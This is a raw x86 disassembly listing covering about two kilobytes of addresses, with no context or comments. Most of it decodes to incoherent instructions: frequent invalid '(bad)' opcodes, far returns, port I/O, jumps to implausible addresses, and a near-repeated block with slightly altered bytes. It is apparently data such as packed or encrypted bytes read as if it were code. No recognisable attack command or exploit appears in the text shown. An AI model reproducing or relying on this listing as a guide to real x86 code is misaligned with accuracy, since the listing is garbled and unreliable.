  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
